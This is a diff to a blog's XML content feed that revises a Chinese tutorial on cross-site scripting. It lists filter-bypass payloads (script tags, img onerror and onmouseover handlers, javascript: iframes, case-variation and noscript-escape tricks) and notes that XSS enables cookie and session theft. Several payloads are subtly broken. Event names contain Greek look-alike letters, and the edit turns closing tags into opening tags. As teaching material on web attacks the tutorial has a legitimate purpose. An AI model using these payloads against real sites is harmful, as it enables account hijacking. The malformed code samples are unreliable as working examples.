@@ -286,17 +286,26 @@ Payloads
 script标签类
 对于没有过滤的很简单的XSS漏洞，可以使用
 
-“<script>alert(“XSS”)</script>”
-<p>有的时候会过滤掉script，大小写、双写等无法绕过，可使用后面的payload。</p>
-<p>结合js的html标签<br>可结合一些onclick、onerror等事件</p>
-<p>&lt;IMG οnmοuseοver=”alert(‘xxs’)”&gt;</p>
-<p>&lt;img src=xss οnerrοr=alert(1)&gt;</p>
-<p>伪协议<br>上面的都不行的话，可以试试伪协议</p>
-<IFRAME src="javascript:alert(1);"><IFRAME>
+<script>alert(“XSS”)<script>
+有的时候会过滤掉script，大小写、双写等无法绕过，可使用后面的payload。
 
-<IMG dynsrc="javascript:javascript:alert(1)">
+结合js的html标签
+可结合一些onclick、onerror等事件
 
-<p>绕过<br>大小写绕过</p>
+<IMG οnmοuseοver="alert('xxs')">
+
+<img src=xss οnerrοr=alert(1)>
+
+伪协议
+上面的都不行的话，可以试试伪协议
+
+<IFRAME SRC="javascript:alert(1);"><IFRAME>
+
+<IMG DYNSRC="javascript:javascript:alert(1)">
+
+绕过
+大小写绕过
+
 <scRipt>alert(“XSS”)<scRipt>
 
 双写绕过
@@ -323,7 +332,7 @@ html编码绕过
 
 <noscript >标签比<img>标签解析优先性更高，所以</noscript >会优先闭合，导致<img>标签逃逸，从而造成xss执行
 
-<noscript><img src="asdasd</noscript><img src=* οnerrοr=prompt(1)>"></noscript>
+<noscript><img src="asdasd</noscript><img src=* οnerrοr=prompt(1)>"><noscript>
 
 危害
 用户的Cookie被获取，其中可能存在Session ID等敏感信息。若服务器端没有做相应防护，攻击者可用对应Cookie登陆服务器。
@@ -357,7 +366,7 @@ XSS Payload：https://github.com/payloadbox/xss-payload-list
 OWASP XSS过滤备忘单：Redirecting…
 
 
-</scRipt></IMG></IFRAME></IFRAME>]]></content>
+</script>]]></content>
   </entry>
   <entry>
     <title>文件上传漏洞</title>
